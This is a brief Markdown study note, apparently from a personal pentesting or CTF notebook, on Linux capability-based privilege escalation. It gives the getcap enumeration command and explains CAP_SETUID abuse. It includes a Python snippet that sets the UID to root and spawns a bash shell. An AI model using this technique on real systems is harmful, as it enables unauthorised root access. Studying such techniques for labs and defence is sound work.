## CAP
Getcap is a privilege  escalation tool to identify any getcap privileges for programs, files or services. 

	getcap -r / 2>/dev/null


##### CAP_SETUID
If you get an cap_setid this is a great sign. if this is associated with a scripting language or the like this will allow the scrip to run at any UID such as root (0) 

Here is a video on how this works:
https://attackdefense.com/challengedetailsnoauth?cid=1384

>import os
os.setuid(0)
os.system("/bin/bash")


Then simply run the command. 

Retunr to [[README]]
